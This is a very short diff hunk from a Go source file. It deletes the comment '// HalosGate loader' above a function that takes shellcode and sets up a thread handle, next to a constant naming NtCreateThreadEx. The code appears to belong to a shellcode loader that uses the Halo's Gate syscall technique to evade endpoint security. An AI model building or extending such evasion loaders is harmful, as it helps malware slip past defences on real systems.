@@ -19,7 +19,6 @@ const (
 	NCT = "NtCreateThreadEx"
 )
 
-// HalosGate loader
 func HalosGate(shellcode []byte) error {
 	var thisThread = uintptr(0xffffffffffffffff)
 
